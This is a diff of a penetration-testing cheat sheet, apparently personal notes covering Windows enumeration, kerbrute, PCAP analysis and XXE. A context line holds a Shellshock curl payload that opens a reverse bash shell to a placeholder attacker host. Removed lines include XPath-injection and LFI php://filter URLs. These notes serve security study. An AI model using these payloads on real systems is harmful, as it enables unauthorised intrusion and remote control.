@@ -50,10 +50,6 @@ Windows enumeration: whoami /all net use z:  tasklist /v \(verbose\) netstat -an
 
 ## -----
 
-aquatone ?? - pulls up series of websites and takes screenshots
-
-## -----
-
 shortcut for all ports: `nmap -p-`
 
 ## -----
@@ -417,13 +413,9 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1' 
 Using plink.exe within PuTTY project folder
 ```
 
-### Windows Architecture and Version
+### Windows Service Start Mode Enumeration
 
-```text
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
-```
-
-### Windows Service Start Mode
+invalid query?
 
 ```text
 wmic service where caption="SERVICE" get startmode
@@ -466,9 +458,7 @@ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object
 
 ### PowerShell to retrieve Active Directory objects \(including deleted\)
 
-### Decode LDAP Passwords
-
-[https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz)
+`Get-ADObject`
 
 ### mysql command line alternative
 
@@ -484,13 +474,7 @@ mysqldump
 
 ### Kerberos check for valid usernames or bruteforce user/pass with kerbrute
 
-```bash
-kerbrute
-```
-
 [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
-
-### 
 
 ### TeamViewer Privilege Escalation -&gt; CVE-2019-189888
 
@@ -683,18 +667,6 @@ _Hosts_
 tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
 ```
 
-### XPATH Dump
-
-```text
-https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
-```
-
-### LFI Retrieve File without executing it
-
-```text
-https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
-```
-
 ### Useful PCAP Reader
 
 ```bash
@@ -754,7 +726,7 @@ _INSIDE DTD FILE_
 %p2;
 ```
 
-### 
+[https://github.com/corneacristian/Notes](https://github.com/corneacristian/Notes)
 
 
 
